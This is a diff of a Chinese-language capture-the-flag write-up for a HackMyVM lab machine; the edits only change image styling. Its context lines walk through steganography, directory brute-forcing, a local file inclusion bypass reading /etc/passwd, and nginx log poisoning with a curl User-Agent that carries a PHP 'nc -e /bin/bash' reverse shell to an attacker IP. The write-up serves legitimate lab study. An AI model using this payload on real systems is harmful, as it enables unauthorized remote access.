@@ -394,7 +394,7 @@ Finished
 <h2>prot 111</h2>
 <p>因为我没有打过这个服务，我就去<a href="https://book.hacktricks.wiki/" rel="nofollow">hacktricks</a>搜索了一下</p>
 <p><strong>资料</strong>：<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port" rel="nofollow">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port</a></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65"><img src="https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65"><img src="https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65" alt="image" style="max-width: 100%;"></a></p>
 <p>阅读文本，我们可以发现它和NFS衔接，我们刚好有NFS</p>
 <p><strong>资料</strong>：<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html" rel="nofollow">https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html</a></p>
 <p>查看挂载</p>
@@ -564,7 +564,7 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 I have <span class="pl-c1">set</span> up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
                                                                                                                                                                                               </pre></div>
 <p>图片里隐藏了一个域名，加入我们的hosts中</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f"><img src="https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f"><img src="https://github.com/user-attachments/assets/bf14a672-496c-47db-a98f-1d17f6ed094f" alt="image" style="max-width: 100%;"></a></p>
 <p>此地无银三百两，爆破目录</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ gobuster dir -u http://thetruthoftalos.hmv/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404
@@ -594,18 +594,18 @@ Finished
 ===============================================================
 </pre></div>
 <p><code class="notranslate">index.php</code>大小明显不一样</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70"><img src="https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70"><img src="https://github.com/user-attachments/assets/def8e796-ace3-4ebd-8bcf-63b4dd56fd70" alt="image" style="max-width: 100%;"></a></p>
 <p>你在输入框中输入点东西，你就会发现一些有趣的东西</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67"><img src="https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67"><img src="https://github.com/user-attachments/assets/ef4998a3-1dc8-41db-98ca-1f051c15be67" alt="image" style="max-width: 100%;"></a></p>
 <p>看着就像有<strong>本地文件包含漏洞</strong></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354"><img src="https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354"><img src="https://github.com/user-attachments/assets/6ad575b8-807f-4354-a765-f58955103354" alt="image" style="max-width: 100%;"></a></p>
 <p>回显不对，应该要<strong>双重绕过</strong></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037"><img src="https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037"><img src="https://github.com/user-attachments/assets/8059191e-e3d0-4dfc-bec9-2f6e559e1037" alt="image" style="max-width: 100%;"></a></p>
 <p>成功获得<code class="notranslate">/etc/passwd</code>，因为没有ssh端口，所以尝试一下日志包含，我们看一下它的架构</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09"><img src="https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09"><img src="https://github.com/user-attachments/assets/916682c6-d518-4861-95d1-48509d52fc09" alt="image" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">/var/log/nginx/access.log
 /var/log/nginx/error.log</pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82"><img src="https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82"><img src="https://github.com/user-attachments/assets/c6c9fd0e-ed0c-488b-b078-78f1ce1afc82" alt="image" style="max-width: 100%;"></a></p>
 <p>可以回显，我们构造一下</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test/tmp]
 └─$ curl http://thetruthoftalos.hmv/shell -H <span class="pl-s"><span class="pl-pds">"</span>User-Agent: &lt;?php exec('nc -e /bin/bash 192.168.205.141 8888')  ?&gt;<span class="pl-pds">"</span></span>
@@ -636,7 +636,7 @@ stty rows 59 cols 236</pre></div>
 <hr>
 <h1>4.提权</h1>
 <p>上来以后转了一圈都没发现什么有意思的东西，我就直接甩了一个linpeas.sh上来了,也无果，但是查看pspy看定时任务的时候发现了这个</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b"><img src="https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b"><img src="https://github.com/user-attachments/assets/f2784510-9099-4ca4-969b-ceaf646ef46b" alt="image" style="max-width: 100%;"></a></p>
 <p>但是我们没有修改的权限</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">www-data@principle2:/tmp$ ls -la /usr/local/share/report
 -rwxrwx--- 1 root talos 16584 Nov 25  2023 /usr/local/share/report
